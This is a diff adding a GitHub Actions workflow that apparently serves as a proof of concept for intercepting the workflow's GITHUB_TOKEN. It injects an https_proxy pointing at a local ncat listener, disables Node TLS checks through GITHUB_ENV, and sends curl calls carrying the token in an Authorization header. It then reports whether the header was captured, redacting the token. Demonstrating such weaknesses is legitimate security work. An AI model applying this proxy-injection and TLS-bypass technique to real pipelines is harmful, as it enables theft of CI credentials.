@@ -1,0 +1,67 @@
+name: MITM Proof — Intercept GITHUB_TOKEN
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  mitm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 — Start proxy listener and set env vars
+        run: |
+          # Start a simple TCP listener that captures raw bytes
+          # This simulates what an attacker's proxy would do
+          ncat -l -p 9999 -o /tmp/captured_request.bin --recv-only -w 3 &
+          LISTENER_PID=$!
+          echo "Listener PID: $LISTENER_PID on port 9999"
+          echo $LISTENER_PID > /tmp/listener_pid
+          
+          # Set proxy + TLS bypass via GITHUB_ENV
+          echo "https_proxy=http://127.0.0.1:9999" >> $GITHUB_ENV
+          echo "NODE_TLS_REJECT_UNAUTHORIZED=0" >> $GITHUB_ENV
+          
+          echo "Step 1: Proxy listener started, env vars set"
+
+      - name: Step 2 — Make a GitHub API call (should go through proxy)
+        env:
+          GITHUB_TOKEN_VAL: ${{ github.token }}
+        run: |
+          # This curl uses GITHUB_TOKEN and should route through the proxy
+          # The proxy captures the raw HTTP CONNECT request
+          echo "Making API call through proxy..."
+          curl -s --connect-timeout 5 -H "Authorization: Bearer $GITHUB_TOKEN_VAL" \
+            "https://api.github.com/user" > /dev/null 2>&1 || true
+          
+          # Also try a plain HTTP request (no TLS, proxy sees everything)
+          curl -s --connect-timeout 5 -H "Authorization: Bearer $GITHUB_TOKEN_VAL" \
+            -H "X-Proof: token-in-header" \
+            "http://api.github.com/user" > /dev/null 2>&1 || true
+          
+          # Wait for listener to capture
+          sleep 2
+          
+          echo "Step 2: API calls made"
+
+      - name: Step 3 — Check what the proxy captured
+        run: |
+          # Kill the listener
+          kill $(cat /tmp/listener_pid) 2>/dev/null || true
+          sleep 1
+          
+          echo "=== Captured request (raw bytes) ==="
+          if [ -f /tmp/captured_request.bin ] && [ -s /tmp/captured_request.bin ]; then
+            echo "File size: $(wc -c < /tmp/captured_request.bin) bytes"
+            echo "--- Content (first 500 bytes) ---"
+            # Show captured data, redacting the actual token
+            cat /tmp/captured_request.bin | head -c 500 | sed 's/ghs_[^ ]*/ghs_[CAPTURED_TOKEN_REDACTED]/g'
+            echo ""
+            echo "--- Check for Authorization header ---"
+            grep -c "Authorization" /tmp/captured_request.bin && echo "Authorization header CAPTURED!" || echo "No Authorization header"
+            echo "--- Check for Bearer token ---"
+            grep -c "Bearer" /tmp/captured_request.bin && echo "Bearer token CAPTURED!" || echo "No Bearer token"
+          else
+            echo "No data captured (proxy not used or connection failed)"
+            ls -la /tmp/captured_request.bin 2>/dev/null || echo "File doesn't exist"
+          fi
